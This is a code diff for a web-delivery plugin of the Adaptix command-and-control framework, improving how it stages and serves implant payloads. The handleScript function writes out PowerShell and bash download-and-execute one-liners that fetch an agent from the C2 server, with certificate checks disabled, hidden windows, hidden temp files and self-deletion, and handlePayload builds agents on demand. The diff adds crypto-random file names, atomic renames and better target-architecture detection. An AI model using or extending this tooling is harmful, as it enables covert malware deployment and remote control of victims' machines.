@@ -1,11 +1,11 @@
 package main
 
 import (
+	"crypto/rand"
 	"crypto/sha256"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"math/rand"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -14,6 +14,7 @@ import (
 	"time"
 
 	adaptix "github.com/Adaptix-Framework/axc2"
+	"golang.org/x/sync/singleflight"
 	"gopkg.in/yaml.v3"
 )
 
@@ -25,6 +26,7 @@ var (
 	Config     WebDeliveryConfig
 	cache      sync.Map
 	configLock sync.Mutex
+	buildGroup singleflight.Group
 )
 
 type Teamserver interface {
@@ -90,6 +92,22 @@ func InitPlugin(ts any, moduleDir string, serviceConfig string) adaptix.PluginSe
 	// Register Management Endpoints
 	Ts.TsEndpointRegister("POST", "/webdelivery/config", handleConfigUpdate)
 	Ts.TsEndpointRegister("POST", "/webdelivery/status", handleStatus)
+
+	// Background cache cleanup — evicts stale entries every 5 minutes
+	go func() {
+		ticker := time.NewTicker(5 * time.Minute)
+		defer ticker.Stop()
+		for range ticker.C {
+			now := time.Now()
+			cache.Range(func(key, value interface{}) bool {
+				entry := value.(CacheEntry)
+				if Config.CacheTTLMin > 0 && now.Sub(entry.BuiltAt) > time.Duration(Config.CacheTTLMin)*time.Minute {
+					cache.Delete(key)
+				}
+				return true
+			})
+		}
+	}()
 
 	fmt.Printf("[WebDelivery] Service initialized. Script: %s, Payload: %s\n", Config.ScriptRoute, Config.PayloadRoute)
 
@@ -189,12 +207,16 @@ func handleScript(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "text/plain")
 	if strings.Contains(ua, "windows") || strings.Contains(ua, "powershell") {
 		// PowerShell one-liner with optional SSL bypass
+		var rnd [4]byte
+		rand.Read(rnd[:])
 		fmt.Fprintf(w, `$p="$env:TEMP\%x.exe"; [Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; (New-Object System.Net.WebClient).DownloadFile("%s", $p); Start-Process $p -WindowStyle Hidden`,
-			rand.Int31(), payloadURL)
+			rnd, payloadURL)
 	} else {
-		// Bash one-liner - sequential execution to avoid 'file not found' during background race
-		fmt.Fprintf(w, "#!/bin/bash\np=\"/tmp/.%x\"\ncurl -skL --http1.1 \"%s\" -o $p\nchmod +x $p\n$p &\nsleep 5\nrm -f $p\n",
-			rand.Int31(), payloadURL)
+		// Bash one-liner — random name from crypto/rand, atomic rename before exec
+		var rnd [4]byte
+		rand.Read(rnd[:])
+		fmt.Fprintf(w, "#!/bin/bash\np=\"/tmp/.%x\"\nt=\"${p}.tmp\"\ncurl -skL --http1.1 \"%s\" -o \"$t\"\nchmod +x \"$t\"\nmv -f \"$t\" \"$p\"\n\"$p\" &\nsleep 5\nrm -f \"$p\"\n",
+			rnd, payloadURL)
 	}
 }
 
@@ -203,18 +225,19 @@ func detectOsArch(ua string) (string, string) {
 	osType := "linux"
 	arch := "amd64"
 
+	// Detect OS
 	if strings.Contains(ua, "windows") || strings.Contains(ua, "powershell") || strings.Contains(ua, "msie") {
 		osType = "windows"
-		if strings.Contains(ua, "x86") || strings.Contains(ua, "wow64") {
-			arch = "x86"
-		}
 	} else if strings.Contains(ua, "darwin") || strings.Contains(ua, "macintosh") {
 		osType = "macos"
-		if strings.Contains(ua, "arm") {
-			arch = "arm64"
-		}
-	} else if strings.Contains(ua, "arm64") || strings.Contains(ua, "aarch64") {
-		osType = "linux"
+	}
+
+	// Detect arch (independent of OS for ARM64 support on all platforms)
+	if strings.Contains(ua, "x86") || strings.Contains(ua, "wow64") || strings.Contains(ua, "i686") {
+		arch = "x86"
+	} else if strings.Contains(ua, "arm64") || strings.Contains(ua, "aarch64") || strings.Contains(ua, "armv8") {
+		arch = "arm64"
+	} else if osType == "macos" && strings.Contains(ua, "arm") {
 		arch = "arm64"
 	}
 
@@ -261,24 +284,29 @@ func handlePayload(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	// Build fresh
+	// Build fresh — singleflight deduplicates concurrent requests for the same payload
 	fmt.Printf("[WebDelivery] Building fresh %s for %s (Format: %s)...\n", Config.AgentName, ip, Config.AgentFormat)
-	payload, filename, err := Ts.TsAgentBuildSyncOnce(Config.AgentName, string(configJSON), []string{Config.Listener})
+	result, err, _ := buildGroup.Do(cacheKey, func() (interface{}, error) {
+		payload, filename, err := Ts.TsAgentBuildSyncOnce(Config.AgentName, string(configJSON), []string{Config.Listener})
+		if err != nil {
+			return nil, err
+		}
+		if Config.CacheTTLMin > 0 {
+			cache.Store(cacheKey, CacheEntry{
+				Payload:  payload,
+				Filename: filename,
+				BuiltAt:  time.Now(),
+			})
+		}
+		return &CacheEntry{Payload: payload, Filename: filename}, nil
+	})
 	if err != nil {
 		fmt.Printf("[WebDelivery] Build failed: %v\n", err)
 		http.Error(w, "Build error: "+err.Error(), 500)
 		return
 	}
-
-	if Config.CacheTTLMin > 0 {
-		cache.Store(cacheKey, CacheEntry{
-			Payload:  payload,
-			Filename: filename,
-			BuiltAt:  time.Now(),
-		})
-	}
-
-	serveBinary(w, payload, filename)
+	entry := result.(*CacheEntry)
+	serveBinary(w, entry.Payload, entry.Filename)
 }
 
 func serveBinary(w http.ResponseWriter, payload []byte, filename string) {
